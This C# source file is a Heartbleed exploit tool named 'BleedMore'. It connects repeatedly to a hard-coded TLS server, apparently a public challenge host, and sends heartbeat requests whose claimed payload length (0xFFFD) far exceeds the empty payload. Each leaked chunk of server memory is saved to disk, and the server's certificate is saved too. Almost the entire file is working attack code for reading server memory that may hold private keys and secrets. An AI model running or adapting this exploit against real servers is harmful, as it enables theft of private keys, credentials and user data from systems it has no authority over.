using System;
using System.Net.Sockets;
using BleedMore.Protocol;
using System.IO;
using System.Security.Cryptography;

// http://tools.ietf.org/html/rfc2246 The TLS Protocol Version 1.0
// http://tools.ietf.org/html/rfc4346 The TLS Protocol Version 1.1
// http://tools.ietf.org/html/rfc5246 The TLS Protocol Version 1.2

namespace BleedMore
{
    class Program
    {
        static string targetHost;
        static int targetPort;
        static TLSStream tlsStream;
        static TLSHandshakeStream tlsHandshakeStream;
        static TLSHeartbeatStream tlsHeartbeatStream;

        static void Main(string[] args)
        {
            Console.WriteLine("BleedMore tool 1.0, based on works of:");
            Console.WriteLine("   Bleed Out by John Leitch");
            Console.WriteLine("   ssltest.py by Jared Stafford");
            Console.WriteLine();

            targetHost = "www.cloudflarechallenge.com";
            targetPort = 443;

            TcpClient client = null;
            while (true)
            {
                try
                {
                    client = new TcpClient();
                    client.Connect(targetHost, targetPort);

                    using (NetworkStream stream = client.GetStream())
                    {
                        tlsStream = new TLSStream(stream);
                        tlsHandshakeStream = new TLSHandshakeStream(tlsStream);
                        tlsHandshakeStream.TLSServerHelloDoneEvent += new TLSHandshakeStream.TLSServerHelloDoneDelegate(HandleServerHelloDone);
                        tlsHandshakeStream.TLSCertificateEvent += new TLSHandshakeStream.TLSCertificateDelegate(HandleCertificate);
                        tlsHeartbeatStream = new TLSHeartbeatStream(tlsStream);
                        tlsHeartbeatStream.TLSHeartbeatResponseEvent += new TLSHeartbeatStream.TLSHeartbeatResponseDelegate(HandleHeartbeatResponse);

                        TLSClientHello hello = new TLSClientHello();
                        hello.ProtocolVersion = new TLSVersion(3, 2);
                        hello.Random = new TLSRandom();
                        hello.Random.GMTUnixTime = 0x53435b90;
                        hello.CipherSuites = new ushort[] { 
                        0xc014, 0xc00a, 0xc022, 0xc021, 0x0039, 0x0038, 0x0088, 0x0087, 
                        0xc00f, 0xc005, 0x0035, 0x0084, 0xc012, 0xc008, 0xc01c, 0xc01b, 
                        0x0016, 0x0013, 0xc00d, 0xc003, 0x000a, 0xc013, 0xc009, 0xc01f, 
                        0xc01e, 0x0033, 0x0032, 0x009a, 0x0099, 0x0045, 0x0044, 0xc00e, 
                        0xc004, 0x002f, 0x0096, 0x0041, 0xc011, 0xc007, 0xc00c, 0xc002, 
                        0x0005, 0x0004, 0x0015, 0x0012, 0x0009, 0x0014, 0x0011, 0x0008, 
                        0x0006, 0x0003, 0x00ff
                        };
                        hello.Compressions = new byte[] { 0 };
                        tlsHandshakeStream.Send(hello);

                        tlsStream.DispatchLoop();
                    }
                }
                catch (EndOfStreamException e)
                {
                }
                catch (Exception e)
                {
                    Console.WriteLine("[!] Something went wrong.");
                    Console.WriteLine(e.ToString());
                    break;
                }
            }
        }

        static void SendHeartbleed()
        {
            TLSHeartbeatRequest req = new TLSHeartbeatRequest();
#if false
            Random rnd = new Random();
            req.PayloadLength = (ushort)rnd.Next(0x100, 0x3FF0);
#else
            req.PayloadLength = 0xFFFD;
#endif
            req.Payload = new byte[0];
            tlsHeartbeatStream.Send(req);
        }

        static void HandleHeartbeatResponse(TLSHeartbeatResponse rsp)
        {
            SHA1CryptoServiceProvider cryptoTransformSHA1 = new SHA1CryptoServiceProvider();
            string hash = BitConverter.ToString(cryptoTransformSHA1.ComputeHash(rsp.Payload)).Replace("-", "");

            Console.WriteLine("[.] Chunk hash = {0}", hash);
            string filePath = targetHost + "-" + hash + ".blob";
            if (File.Exists(filePath))
            {
                Console.WriteLine("[.] Chunk already known.");
            }
            else
            {
                using (FileStream stream = new FileStream(filePath, FileMode.OpenOrCreate, FileAccess.Write))
                {
                    stream.Write(rsp.Payload, 0, rsp.Payload.Length);
                }
            }

            throw new EndOfStreamException();
        }

        static void HandleCertificate(TLSCertificate msg)
        {
            using (FileStream fs = new FileStream(targetHost + ".pem", FileMode.Create, FileAccess.Write))
            {
                fs.Write(msg.X509Data, 0, msg.X509Data.Length);
            }
        }

        static void HandleServerHelloDone()
        {
            SendHeartbleed();
        }
    }
}
